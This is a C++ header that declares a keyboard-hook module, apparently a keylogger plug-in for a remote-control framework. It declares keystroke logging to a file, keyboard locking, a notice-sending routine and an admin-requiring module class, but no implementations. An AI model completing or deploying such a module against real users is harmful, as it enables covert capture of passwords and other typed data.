#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <Windows.h>
#include <ctime>
#include <fstream>
#include <iostream>
#include <map>
#include <mutex>
#include <sstream>
#include <thread>
#include <vector>

#include "RCDOMod.h"
#include "utils.h"

LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
void logKeystroke(int);
void lockKeyboard();
bool releaseHook();
bool setHook();
void setLogFile();
void sendNotice();

extern std::map<int, std::wstring> mapSpecialKeys;
extern HHOOK ghHook;
extern KBDLLHOOKSTRUCT kbdStruct;
extern std::wofstream logFile;
extern std::mutex logFileMutex;
extern bool noticeSentForSession;
extern std::pair<bool, bool> caseStatus;
class KeyboardMod : public RCDOMod {
public:
    int requireAdmin();
    void start();
    void kill();
};

#endif
